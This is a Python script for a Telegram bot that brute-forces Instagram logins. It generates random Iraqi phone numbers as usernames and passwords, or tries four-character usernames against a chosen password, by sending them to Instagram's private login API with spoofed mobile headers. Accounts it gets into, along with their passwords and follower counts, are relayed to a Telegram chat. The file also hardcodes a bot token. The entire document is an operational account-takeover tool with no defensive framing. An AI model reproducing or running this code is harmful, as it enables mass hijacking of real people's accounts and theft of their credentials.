import  os , random, requests , time ,uuid
from bs4 import BeautifulSoup
from telebot import types,TeleBot

bot = TeleBot('5663483826:AAEm_gvlImAJ9guRuDoR8HNrN8CxmejnJEI')

def info_acc(username,pas,message):
	
	content = requests.get('https://www.instagram.com/' + username,headers = {'User-agent': 'your bot 0.1'}).text
	source = BeautifulSoup(content, 'html.parser')
	description = source.find("meta", {"property": "og:description"}).get("content")
	info_list = description.split("-")[0]
	followers = info_list[0:info_list.index("Followers")]
	info_list = info_list.replace(followers + "Followers, ", "")
	following = info_list[0:info_list.index("Following")]
	info_list = info_list.replace(following + "Following, ", "")
	posts = info_list[0:info_list.index("Posts")]
	tt = time.asctime()
	time.sleep(1)
	bot.send_message(message.chat.id,text=f'⌯  Hi  Successful 💯 ⌯\n — — — — —  — — — — — .\n.✥. Pass  : {pas}\n.✥. User  : {username}\n.✥. Follwers : {followers}\n.✥. Foolowing : {following}\n.✥. Post : {posts}\n⌯{tt}\n. — — — — —  — — — — —\n•.')
#------------------------------------------------------------------------------------------------------------------------0



def iraq077(message):
	os.system('clear')
	new = "0987654321"
	tt=time.asctime()
	r = requests.session()
	
	
	
	Ok = 0
	Cp = 0
	Sk = 0
	
	
	
	while True:
		user = str(''.join((random.choice(new) for i in range(7))))
		q = '+964'
		rx = ['0','1','2','3','4']
		xr = random.choice(rx)
		Email = q+'77'+xr+user
		pas = '077'+xr+user
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'
}
		
		uid = uuid.uuid4()
		payload = { 
        'uuid': uid,
		'password': pas,
		'username': Email,
		'device_id': uid,
	    'from_reg': 'false',
	    '_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=payload)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			info_acc(username,pas,message)
		
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			bot.send_message(message.chat.id,text=f' ⌯  Hi  Checkpoint 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @SidraTools .')
		else:
			Sk+=1
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f'✰︎ Welcome   💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥')
			######################
def iraq078(message):
	os.system('clear')
	new = "0987654321"
	tt=time.asctime()
	r = requests.session()
	
	
	
	Ok = 0
	Cp = 0
	Sk = 0
	
	
	
	while True:
		user = str(''.join((random.choice(new) for i in range(7))))
		q = '+964'
		rx = ['0','1','2','3','4']
		xr = random.choice(rx)
		Email = q+'78'+xr+user
		pas = '078'+xr+user
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'
}
		
		uid = uuid.uuid4()
		payload = { 
        'uuid': uid,
		'password': pas,
		'username': Email,
		'device_id': uid,
	    'from_reg': 'false',
	    '_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=payload)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			info_acc(username,pas,message)
		
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			bot.send_message(message.chat.id,text=f' ⌯  Hi  Checkpoint 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @SidraTools .')
		else:
			Sk+=1
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f'✰︎ Welcome   💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥')
			###############
			
			
			
			
			###
			
			##
			##
			
			###
			
def f4(message):
    b = types.InlineKeyboardMarkup()
    bb = types.InlineKeyboardButton
    b1 = bb('تعيين كلمه مرور',callback_data='pas')
    b2 = bb('بدأ الصيد',callback_data='4run')
    b.add(b1,b2)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text='*أختر يا عزيزي :)*',parse_mode='markdown',reply_markup=b)
def pas4(message):
    x = bot.send_message(message.chat.id,'ارسل الرمز ياحلوو : ')
    bot.register_next_step_handler(x,f4pas)
def f4pas(message):
    open('pass.txt','w').write(message.text)
    bot.reply_to(message,'*تم تعيين كلمه المرور الخاصة بالتخمين الان قم بضغط بدأ الصيد :/*',parse_mode='markdown')
def f44(message):
	
	os.system('clear')
	new = "qwertyuiopasdfghjklmnbvcxz_0987654321"
	tt=time.asctime()
	r = requests.session()
	
	
	
	Ok = 0
	Cp = 0
	Sk = 0
	
	
	
	while True:
		user = str(''.join((random.choice(new) for i in range(4))))
		#q = '+964'
		#rx = ['0','1','2','3','4']
		#xr = random.choice(rx)
		Email = user
		pas = open('pass.txt','r').read()
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'
}
		
		uid = uuid.uuid4()
		payload = { 
        'uuid': uid,
		'password': pas,
		'username': Email,
		'device_id': uid,
	    'from_reg': 'false',
	    '_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=payload)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			info_acc(username,pas,message)
		
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			bot.send_message(message.chat.id,text=f' ⌯  Hi  Checkpoint 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @SidraTools .')
		else:
			Sk+=1
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f'✰︎ Welcome   💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥')
			###############
def iraq075(message):
	os.system('clear')
	new = "0987654321"
	tt=time.asctime()
	r = requests.session()
	
	
	
	Ok = 0
	Cp = 0
	Sk = 0
	
	
	
	while True:
		user = str(''.join((random.choice(new) for i in range(8))))
		q = '+964'
		rx = ['0','1','2','3','4']
		xr = random.choice(rx)
		Email = q+'75'+xr+user
		pas = '075'+xr+user
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'
}
		
		uid = uuid.uuid4()
		payload = { 
        'uuid': uid,
		'password': pas,
		'username': Email,
		'device_id': uid,
	    'from_reg': 'false',
	    '_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=payload)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			info_acc(username,pas,message)
		
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			bot.send_message(message.chat.id,text=f' ⌯  Hi  Checkpoint 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @SidraTools .')
		else:
			Sk+=1
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f'✰︎ Welcome   💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥')
			###############
			
def start(message):
    b = types.InlineKeyboardMarkup()
    bb = types.InlineKeyboardButton
    b1 = bb(text='IRAQ',callback_data='IRAQ')
    b2 = bb(text='رباعي',callback_data='4')
    b.add(b2)
    b.add(b1)
    bot.send_message(message.chat.id,text='*Hi bro :/ \n============\n⌯please choice : *',parse_mode='markdown',reply_markup=b)
@bot.message_handler(commands=['start'])
def s(message):
    start(message)
def iraqbtn(message):
    b = types.InlineKeyboardMarkup()
    bb = types.InlineKeyboardButton
    b1 = bb(text='077',callback_data='IRAQ077')
    b2 =bb(text='078',callback_data='IRAQ078')
    b3 = bb(text='075',callback_data='IRAQ075')
    b.add(b1)
    b.add(b2)
    b.add(b3)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text='*⌯CHOICE : *',reply_markup=b,parse_mode='markdown')
@bot.callback_query_handler(lambda call:True)
def answer(call):
    if call.data=='IRAQ077':
        iraq077(call.message)
    elif call.data=='IRAQ078':
        iraq078(call.message)
    elif call.data=='IRAQ075':
        iraq075(call.message)
    elif call.data=='IRAQ':
         iraqbtn(call.message)
    elif call.data=='4':
        f4(call.message)
    elif call.data=='pas':
        pas4(call.message)
    elif call.data=='4run':
        f44(call.message)

bot.infinity_polling()